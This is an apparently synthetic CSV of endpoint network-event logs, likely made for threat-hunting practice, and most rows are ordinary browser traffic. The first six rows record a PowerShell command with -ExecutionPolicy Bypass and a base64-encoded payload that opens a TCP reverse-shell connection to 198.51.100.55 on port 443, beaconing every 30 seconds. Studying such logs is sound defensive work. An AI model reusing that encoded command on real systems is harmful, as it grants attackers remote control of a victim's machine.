TimeGenerated,Timestamp,DeviceName,ActionType,LocalIP,LocalIPType,LocalPort,RemoteIP,RemoteIPType,RemotePort,RemoteUrl,Protocol,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,InitiatingProcessAccountName,InitiatingProcessSHA256,Type
2026-04-29T13:32:00Z,2026-04-29T13:32:00Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,59663,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:32:30Z,2026-04-29T13:32:30Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,58066,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:33:00Z,2026-04-29T13:33:00Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,57882,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:33:30Z,2026-04-29T13:33:30Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,60507,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:34:00Z,2026-04-29T13:34:00Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,52435,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:34:30Z,2026-04-29T13:34:30Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,49541,198.51.100.55,Public,443,,Tcp,powershell.exe,C:\Windows\System32,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T14:21:28Z,2026-04-28T14:21:28Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,56022,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T07:15:44Z,2026-04-29T07:15:44Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,64365,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:44:59Z,2026-04-29T13:44:59Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,55277,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T19:06:57Z,2026-04-28T19:06:57Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,54629,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T11:48:53Z,2026-04-28T11:48:53Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,62692,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T22:03:03Z,2026-04-28T22:03:03Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,57700,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T04:38:11Z,2026-04-29T04:38:11Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,54697,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T05:03:16Z,2026-04-29T05:03:16Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,54245,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T05:36:51Z,2026-04-29T05:36:51Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,59413,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T18:51:04Z,2026-04-28T18:51:04Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,57719,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T20:10:04Z,2026-04-28T20:10:04Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,50612,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:25:19Z,2026-04-29T13:25:19Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,60900,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T15:09:01Z,2026-04-28T15:09:01Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,53879,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T10:27:03Z,2026-04-28T10:27:03Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,58517,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T19:31:24Z,2026-04-28T19:31:24Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,62962,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T17:19:11Z,2026-04-28T17:19:11Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,63455,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T09:56:42Z,2026-04-29T09:56:42Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,55379,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T13:24:10Z,2026-04-29T13:24:10Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,55962,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T03:27:57Z,2026-04-29T03:27:57Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,58304,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T13:54:20Z,2026-04-28T13:54:20Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,57725,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T18:33:15Z,2026-04-28T18:33:15Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,49283,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T13:39:10Z,2026-04-28T13:39:10Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,60343,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T11:33:18Z,2026-04-29T11:33:18Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,54790,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T08:24:13Z,2026-04-29T08:24:13Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,52252,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T06:00:53Z,2026-04-29T06:00:53Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,53369,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T16:35:12Z,2026-04-28T16:35:12Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,59353,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T06:06:24Z,2026-04-29T06:06:24Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,57686,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T02:52:40Z,2026-04-29T02:52:40Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,54819,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T11:35:04Z,2026-04-29T11:35:04Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,49566,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T23:06:10Z,2026-04-28T23:06:10Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,61526,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T06:49:00Z,2026-04-29T06:49:00Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,56887,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T12:29:00Z,2026-04-28T12:29:00Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,56823,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T22:34:10Z,2026-04-28T22:34:10Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,52740,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T22:22:22Z,2026-04-28T22:22:22Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,60718,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T06:52:29Z,2026-04-29T06:52:29Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,62554,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T12:43:44Z,2026-04-28T12:43:44Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,56443,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T04:02:41Z,2026-04-29T04:02:41Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,56084,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T05:49:42Z,2026-04-29T05:49:42Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,60495,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T22:53:05Z,2026-04-28T22:53:05Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,56224,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T20:44:15Z,2026-04-28T20:44:15Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,61913,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T19:59:15Z,2026-04-28T19:59:15Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,61579,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T23:42:31Z,2026-04-28T23:42:31Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,55893,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T15:33:03Z,2026-04-28T15:33:03Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,65118,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T21:59:58Z,2026-04-28T21:59:58Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,59318,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T04:34:41Z,2026-04-29T04:34:41Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,53173,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T12:36:38Z,2026-04-29T12:36:38Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,61829,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T23:23:21Z,2026-04-28T23:23:21Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,55489,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T19:26:03Z,2026-04-28T19:26:03Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,60998,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T18:23:06Z,2026-04-28T18:23:06Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,65166,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T17:11:13Z,2026-04-28T17:11:13Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,55360,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T10:24:28Z,2026-04-29T10:24:28Z,SVR-DC-01,ConnectionSuccess,10.0.20.5,Private,55468,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T03:58:24Z,2026-04-29T03:58:24Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,65418,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,jadams,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T10:55:35Z,2026-04-29T10:55:35Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,65448,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T20:16:25Z,2026-04-28T20:16:25Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,64884,17.253.144.10,Public,443,www.apple.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T03:59:10Z,2026-04-29T03:59:10Z,WS-DEV-02,ConnectionSuccess,10.0.10.11,Private,56405,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T21:16:07Z,2026-04-28T21:16:07Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,60161,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T12:54:19Z,2026-04-29T12:54:19Z,WS-HR-03,ConnectionSuccess,10.0.10.12,Private,59588,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,dchen,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-29T02:43:44Z,2026-04-29T02:43:44Z,SVR-WEB-01,ConnectionSuccess,10.0.20.10,Private,61825,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T09:54:55Z,2026-04-28T09:54:55Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,62634,142.250.80.110,Public,443,www.google.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,bryce,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
2026-04-28T19:14:31Z,2026-04-28T19:14:31Z,WS-FINANCE-01,ConnectionSuccess,10.0.10.10,Private,57337,13.107.42.14,Public,443,outlook.office365.com,Tcp,chrome.exe,C:\Windows\System32,chrome.exe,mholmes,0000000000000000000000000000000000000000000000000000000000000000,DeviceNetworkEvents
